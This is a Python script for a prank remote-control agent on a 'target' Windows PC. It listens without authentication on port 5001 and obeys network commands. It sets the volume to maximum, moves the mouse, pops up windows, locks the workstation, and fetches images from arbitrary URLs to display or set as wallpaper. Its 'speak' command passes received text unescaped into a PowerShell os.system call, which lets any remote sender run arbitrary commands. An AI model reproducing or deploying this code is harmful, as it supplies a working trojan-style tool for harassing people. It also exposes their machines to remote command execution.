import socket
import pygame
import os
import random
import pyautogui
import threading
import ctypes
import webbrowser
import urllib.request
import tempfile
import tkinter as tk
from tkinter import Label
from PIL import Image, ImageTk, ImageOps
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL

pygame.mixer.init()
ASSETS_DIR = os.path.join(os.path.dirname(__file__), "assets")

def get_volume_interface():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    return cast(interface, POINTER(IAudioEndpointVolume))

def set_max_volume():
    volume = get_volume_interface()
    volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(1.0, None)

def set_half_volume():
    volume = get_volume_interface()
    volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(0.5, None)

def mute_volume():
    volume = get_volume_interface()
    volume.SetMute(1, None)

def unmute_volume():
    volume = get_volume_interface()
    volume.SetMute(0, None)

def play_sound(name):
    filepath = os.path.join(ASSETS_DIR, "sounds", f"{name}.mp3")
    if os.path.exists(filepath):
        pygame.mixer.music.load(filepath)
        pygame.mixer.music.play()
    else:
        print(f"❌ Fichier non trouvé : {filepath}")

def show_emolio_on_target():
    def run():
        emolio_dir = os.path.join(ASSETS_DIR, "emolio")
        emolio_images_list = [f for f in os.listdir(emolio_dir) if f.endswith(".png")]
        if not emolio_images_list:
            print("❌ Aucun fichier Emolio trouvé.")
            return
        filename = random.choice(emolio_images_list)
        filepath = os.path.join(emolio_dir, filename)

        root = tk.Tk()
        root.overrideredirect(True)
        root.attributes("-topmost", True)

        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()

        img = Image.open(filepath)
        img_width, img_height = img.size
        x = random.randint(0, screen_width - img_width)
        y = random.randint(0, screen_height - img_height)

        root.geometry(f"{img_width}x{img_height}+{x}+{y}")
        tk_image = ImageTk.PhotoImage(img)
        label = Label(root, image=tk_image)
        label.image = tk_image
        label.pack()

        root.after(2000, root.destroy)
        root.mainloop()

    threading.Thread(target=run).start()

def open_work_html_on_target():
    filepath = os.path.join(ASSETS_DIR, "work.html")
    if os.path.exists(filepath):
        webbrowser.open(f"file://{filepath}")
    else:
        print(f"❌ Fichier work.html introuvable : {filepath}")

HOST = '0.0.0.0'
PORT = 5001

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print("🔌 En attente de connexion...")

    while True:
        conn, addr = s.accept()
        with conn:
            data = conn.recv(1024).decode().strip()
            print(f"📥 Commande reçue : {data}")

            if data.startswith("sound:"):
                play_sound(data.split("sound:")[1])

            elif data.startswith("speak:"):
                text = data.split("speak:")[1]
                os.system(f'powershell "Add-Type –AssemblyName System.Speech; '
                          f'(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{text}\')"')

            elif data.startswith("msg:"):
                import ctypes
                msg = data.split("msg:")[1]
                ctypes.windll.user32.MessageBoxW(0, msg, "Message du réseau", 0)

            elif data == "move_mouse":
                try:
                    screen_width, screen_height = pyautogui.size()
                    x = random.randint(0, screen_width)
                    y = random.randint(0, screen_height)
                    pyautogui.moveTo(x, y, duration=0.5)
                    print(f"🖱 Souris déplacée vers ({x}, {y})")
                except Exception as e:
                    print(f"❌ Erreur déplacement souris : {e}")

            elif data == "emolio":
                show_emolio_on_target()

            elif data == "work":
                open_work_html_on_target()

            elif data.startswith("volume:set:"):
                try:
                    level = float(data.split("volume:set:")[1])
                    volume = get_volume_interface()
                    volume.SetMute(0, None)
                    volume.SetMasterVolumeLevelScalar(level, None)
                    print(f"🔊 Volume réglé à {int(level * 100)}%")
                except Exception as e:
                    print(f"❌ Erreur réglage volume : {e}")

            elif data == "volume:mute":
                mute_volume()

            elif data == "volume:unmute":
                unmute_volume()
            elif data == "lock":
                os.system("rundll32.exe user32.dll,LockWorkStation")
            elif data.startswith("image_url:"):
                url = data.split("image_url:")[1]

                def show_image_from_url(image_url):
                    try:
                        req = urllib.request.Request(
                            image_url,
                            headers={"User-Agent": "Mozilla/5.0"}
                        )
                        with urllib.request.urlopen(req) as response:
                            image_data = response.read()

                        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
                            tmp.write(image_data)
                            tmp_path = tmp.name

                        def show_image():
                            root = tk.Tk()
                            root.overrideredirect(True)
                            root.attributes("-topmost", True)

                            screen_width = root.winfo_screenwidth()
                            screen_height = root.winfo_screenheight()

                            img = Image.open(tmp_path)

                            # Redimensionner si l'image est trop grande
                            screen_width = root.winfo_screenwidth()
                            screen_height = root.winfo_screenheight()
                            img_width, img_height = img.size

                            max_width = int(screen_width * 0.6)
                            max_height = int(screen_height * 0.6)

                            if img_width > max_width or img_height > max_height:
                                img.thumbnail((max_width, max_height), Image.Resampling.LANCZOS)
                                img_width, img_height = img.size
                            x = random.randint(0, screen_width - img_width)
                            y = random.randint(0, screen_height - img_height)

                            root.geometry(f"{img_width}x{img_height}+{x}+{y}")
                            tk_image = ImageTk.PhotoImage(img)
                            label = Label(root, image=tk_image)
                            label.image = tk_image
                            label.pack()

                            root.after(3000, root.destroy)
                            root.mainloop()

                        threading.Thread(target=show_image).start()

                    except Exception as e:
                        print(f"❌ Erreur affichage image : {e}")

                threading.Thread(target=show_image_from_url, args=(url,)).start()
            elif data.startswith("set_wallpaper:"):
                url = data.split("set_wallpaper:")[1]

                def set_wallpaper_from_url(image_url):
                    try:
                        # Télécharger l'image avec un header User-Agent
                        req = urllib.request.Request(
                            image_url,
                            headers={"User-Agent": "Mozilla/5.0"}
                        )
                        with urllib.request.urlopen(req) as response:
                            image_data = response.read()

                        # Enregistrer l'image dans un fichier temporaire
                        with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp_img:
                            tmp_img.write(image_data)
                            tmp_img_path = tmp_img.name

                        # Convertir en BMP
                        from PIL import Image
                        img = Image.open(tmp_img_path)
                        bmp_path = tmp_img_path.replace(".jpg", ".bmp")
                        img.save(bmp_path, "BMP")

                        # Appliquer le fond d'écran
                        ctypes.windll.user32.SystemParametersInfoW(20, 0, bmp_path, 3)
                        print("✅ Fond d’écran appliqué avec succès")

                    except Exception as e:
                        print(f"❌ Erreur fond d’écran : {e}")

                threading.Thread(target=set_wallpaper_from_url, args=(url,)).start()



